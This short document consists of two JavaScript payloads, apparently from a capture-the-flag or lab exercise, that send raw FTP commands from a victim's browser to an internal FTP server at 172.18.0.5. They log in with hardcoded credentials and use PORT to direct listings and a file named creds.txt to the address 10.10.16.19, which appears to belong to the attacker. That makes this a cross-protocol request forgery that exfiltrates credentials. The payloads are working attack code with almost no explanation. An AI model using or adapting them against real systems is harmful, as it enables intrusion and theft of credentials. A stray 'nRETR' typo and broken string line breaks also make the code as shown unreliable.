

<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://172.18.0.5:2121/',true);
xhr.setRequestHeader("Content-Type", "application/x-www-
form-urlencoded");
xhr.onreadystatechange = function() {
    if (this.readyState === XMLHttpRequest.DONE &&
this.status === 200) {
} }
xhr.send("USER ftp_user\r\nPASS Secret12345\r\nPORT
10,10,16,19,209,205\r\nLIST\r\n");
</script>


// https://www.serv-u.com/resources/tutorial/pasv-response-epsv-port-pbsz-rein-ftp-command


<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", 'http://172.18.0.5:2121/',true);
xhr.setRequestHeader("Content-Type", "application/x-www-
form-urlencoded");
xhr.onreadystatechange = function() {
    if (this.readyState === XMLHttpRequest.DONE &&
this.status === 200) {
} }
xhr.send("USER ftp_user\r\nPASS Secret12345\r\nPORT
10,10,16,19,209,205\r\nnRETR creds.txt\r\n");
</script>
